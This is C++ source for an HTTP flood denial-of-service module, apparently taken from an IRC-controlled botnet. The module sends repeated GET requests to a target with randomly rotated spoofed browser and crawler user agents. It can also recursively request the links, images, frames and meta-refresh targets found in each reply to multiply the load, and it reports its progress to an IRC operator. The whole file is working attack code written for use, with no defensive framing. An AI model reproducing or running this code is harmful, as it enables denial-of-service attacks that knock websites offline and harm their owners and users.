

#include "main.h"
#include "mainctrl.h"
#include "utility.h"

char *g_szUserAgents[]={
	"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)", 
	"Googlebot/2.1 (+http://www.googlebot.com/bot.html)", 
	"Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.6", 
	"Microsoft-WebDAV-MiniRedir/5.1.2600", 
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", 
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", 
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)", 
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows  NT 5.1; Q312461)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; H010818; AT&T CSM6.0)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 1.0.3705)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; .NET CLR 1.1.4322)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; DigExt)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts-MyWay; (R1 1.3); .NET CLR 1.1.4322)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Hotbar 4.3.1.0)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ODI3 Navigator)", 
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)", 
	"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)", 
	"Mozilla/4.75 [en]", 
	"Mozilla/5.0 (Slurp/cat; slurp@inktomi.com; http://www.inktomi.com/slurp.html)", 
	"Mozilla/5.0 (Slurp/si; slurp@inktomi.com; http://www.inktomi.com/slurp.html)", 
	"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.5) Gecko/20031007", 
	"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.5a) Gecko/20030718", 
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.5a) Gecko/20030728 Mozilla Firebird/0.6.1", 
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.5) Gecko/20031021", 
	"Scooter/3.2", 
	"Wget/1.7", 
	"Wget/1.8.2", 
	"pxys/1.9.4",
	NULL };

CDDOSHTTPFlood::CDDOSHTTPFlood() { m_szType="CDDOSHTTPFlood"; m_sDDOSName.Assign("httpflood"); }

CString DoHTTPRequest(const char *szRequest, url &uURL)
{	CSocket sSocket; int d;
	
	if(!sSocket.Connect(uURL.sHost.CStr(), uURL.iPort)) return CString("");

	sSocket.Write(szRequest, strlen(szRequest));
	
	char szBuf[4096]; CString sReply("");
	while(true)
	{	int i; sSocket.Recv(szBuf, 4096, &i);
		if(i<=0) break; if(i<4096) szBuf[i]=0; sReply.Append(szBuf);
		for(d=0;d<i;d++) if(!strncmp(szBuf+d,"\r\n\r\n",4))
		{	goto done_http; } }
done_http:
	while(true)
	{	int i; sSocket.Recv(szBuf, 4096, &i);
		if(i<=0) break; if(i<4096) szBuf[i]=0; sReply.Append(szBuf); }

	sSocket.Disconnect();

	return sReply;
}

void CDDOSHTTPFlood::StartDDOS() {
	int iNumSent=0; url uURL; init_random();

	if(!ParseURL(m_sURL.CStr(), &uURL)) {
		g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
			"%s: failed to parse \"%s\".", m_sDDOSName.CStr(), m_sURL.CStr());
		return; }

	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
		"%s: flooding %s port %u, %u times, %d ms delay.", m_sDDOSName.CStr(), \
		uURL.sHost.CStr(), uURL.iPort, m_iNumber, m_iDelay);

	int iNumUserAgents=0; while(g_szUserAgents[iNumUserAgents]) iNumUserAgents++; iNumUserAgents--;

	while(g_pMainCtrl->m_cDDOS.m_bDDOSing && iNumSent < m_iNumber) {
		int iUserAgent=brandom(0, iNumUserAgents);
		char *szUserAgent=g_szUserAgents[iUserAgent];
		CString sSendBuf, sReqHost;
		
		if(uURL.iPort==80) {
			sReqHost.Format("Host: %s", uURL.sHost.CStr());
		} else {
			sReqHost.Format("Host: %s:%d", uURL.sHost.CStr(), uURL.iPort);
		}

		sSendBuf.Format("GET %s HTTP/1.1\r\n" \
			"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, */*\r\n" \
			"Accept-Language: en-us,en\r\n" \
			"User-Agent: %s\r\n" \
			"%s\r\n" \
			"Referer: %s\r\n" \
			"Connection: close\r\n\r\n", \
			uURL.sReq.CStr(), szUserAgent, sReqHost.CStr(), m_sReferrer.CStr());

		CString sReply=DoHTTPRequest(sSendBuf.CStr(), uURL);

		while(m_bRecursive) {
			url uURLTemp; if(!sReply.Find('<')) break;
			CString sTemp=sReply.Mid(sReply.Find('<')); sReply=sTemp;
			CString sFullTag=sReply.Mid(0, (sReply.GetLength()-(sReply.GetLength()-sReply.Find('>')))-1);
			CString sTag=sFullTag.Token(0, " ");

			if(!sTag.CompareNoCase("meta") && sFullTag.Find("\"Refresh\"")) {
				CString sContent=sFullTag.Token(3, " ");
				sTemp=sContent.Mid(sContent.Find('=')); sContent=sTemp;
				sTemp=sContent.Mid(0, sContent.GetLength()-1); sContent=sTemp;
				CString sURL(sContent);

				if(ParseURL(sURL.CStr(), &uURLTemp)) {
					if(uURLTemp.iPort==80) {
						sReqHost.Format("Host: %s", uURLTemp.sHost.CStr());
					} else {
						sReqHost.Format("Host: %s:%d", uURLTemp.sHost.CStr(), uURLTemp.iPort);
					}
					sSendBuf.Format("GET %s HTTP/1.1\r\n" \
						"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, */*\r\n" \
						"Accept-Language: en-us,en\r\n" \
						"User-Agent: %s\r\n" \
						"%s\r\n" \
						"Referer: %s\r\n" \
						"Connection: close\r\n\r\n", \
						uURLTemp.sReq.CStr(), szUserAgent, sReqHost.CStr(), m_sURL.CStr());

					DoHTTPRequest(sSendBuf.CStr(), uURLTemp);
				}
			} else if(!sTag.CompareNoCase("a")) {
				int iCount=0; CString sToken(sFullTag.Token(iCount, " ").Token(0, "="));
				while(sToken.CompareNoCase("href") && sToken.Compare("")) {
					iCount++; sToken.Assign(sFullTag.Token(iCount, " ").Token(0, "="));
				}
				if(sToken.Compare("")) {
					CString sLink(sFullTag.Token(iCount, " ").Token(1, "=", true)), sURL;
					if(sLink[0]=='/')
						sURL.Format("http://%s:%d%s", uURL.sHost.CStr(), uURL.iPort, sLink.CStr());
					else if(sLink.Find("http://")) {
						sURL.Assign(sLink);
					} else {
						sURL.Format("http://%s:%d%s%s", uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr(), sLink.CStr());
					}

					if(ParseURL(sURL.CStr(), &uURLTemp)) {
						if(uURLTemp.iPort==80) {
							sReqHost.Format("Host: %s", uURLTemp.sHost.CStr());
						} else {
							sReqHost.Format("Host: %s:%d", uURLTemp.sHost.CStr(), uURLTemp.iPort);
						}
						sSendBuf.Format("GET %s HTTP/1.1\r\n" \
							"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, */*\r\n" \
							"Accept-Language: en-us,en\r\n" \
							"User-Agent: %s\r\n" \
							"%s\r\n" \
							"Referer: %s\r\n" \
							"Connection: close\r\n\r\n", \
							uURLTemp.sReq.CStr(), szUserAgent, sReqHost.CStr(), m_sURL.CStr());

						DoHTTPRequest(sSendBuf.CStr(), uURLTemp);
					}
				}
			} else if(!sTag.CompareNoCase("img")) {
				int iCount=0; CString sToken(sFullTag.Token(iCount, " ").Token(0, "="));
				while(sToken.CompareNoCase("src") && sToken.Compare("")) {
					iCount++; sToken.Assign(sFullTag.Token(iCount, " ").Token(0, "="));
				}
				if(sToken.Compare("")) {
					CString sLink(sFullTag.Token(iCount, " ").Token(1, "=", true)), sURL;
					if(sLink[0]=='/')
						sURL.Format("http://%s:%d%s", uURL.sHost.CStr(), uURL.iPort, sLink.CStr());
					else if(sLink.Find("http://")) {
						sURL.Assign(sLink);
					} else {
						sURL.Format("http://%s:%d%s%s", uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr(), sLink.CStr());
					}

					if(ParseURL(sURL.CStr(), &uURLTemp)) {
						if(uURLTemp.iPort==80) {
							sReqHost.Format("Host: %s", uURLTemp.sHost.CStr());
						} else {
							sReqHost.Format("Host: %s:%d", uURLTemp.sHost.CStr(), uURLTemp.iPort);
						}
						sSendBuf.Format("GET %s HTTP/1.1\r\n" \
							"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, */*\r\n" \
							"Accept-Language: en-us,en\r\n" \
							"User-Agent: %s\r\n" \
							"%s\r\n" \
							"Referer: %s\r\n" \
							"Connection: close\r\n\r\n", \
							uURLTemp.sReq.CStr(), szUserAgent, sReqHost.CStr(), m_sURL.CStr());

						DoHTTPRequest(sSendBuf.CStr(), uURLTemp);
					}
				}
			} else if(!sTag.CompareNoCase("frame") || !sTag.CompareNoCase("iframe")) {
				int iCount=0; CString sToken(sFullTag.Token(iCount, " ").Token(0, "="));
				while(sToken.CompareNoCase("src") && sToken.Compare("")) {
					iCount++; sToken.Assign(sFullTag.Token(iCount, " ").Token(0, "="));
				}
				if(sToken.Compare("")) {
					CString sLink(sFullTag.Token(iCount, " ").Token(1, "=", true)), sURL;
					if(sLink[0]=='/')
						sURL.Format("http://%s:%d%s", uURL.sHost.CStr(), uURL.iPort, sLink.CStr());
					else if(sLink.Find("http://")) {
						sURL.Assign(sLink);
					} else {
						sURL.Format("http://%s:%d%s%s", uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr(), sLink.CStr());
					}

					if(ParseURL(sURL.CStr(), &uURLTemp)) {
						if(uURLTemp.iPort==80) {
							sReqHost.Format("Host: %s", uURLTemp.sHost.CStr());
						} else {
							sReqHost.Format("Host: %s:%d", uURLTemp.sHost.CStr(), uURLTemp.iPort);
						}
						sSendBuf.Format("GET %s HTTP/1.1\r\n" \
							"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, */*\r\n" \
							"Accept-Language: en-us,en\r\n" \
							"User-Agent: %s\r\n" \
							"%s\r\n" \
							"Referer: %s\r\n" \
							"Connection: close\r\n\r\n", \
							uURLTemp.sReq.CStr(), szUserAgent, sReqHost.CStr(), m_sURL.CStr());

						DoHTTPRequest(sSendBuf.CStr(), uURLTemp);
					}
				}
			}
		}

		int iSleep; if(!m_iDelay) iSleep=brandom(3600000, 86400000); else iSleep=m_iDelay;

		Sleep(iSleep); iNumSent++; }
	
	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
		"%s: finished flooding %s port %u", m_sDDOSName.CStr(), uURL.sHost.CStr(), uURL.iPort);
}
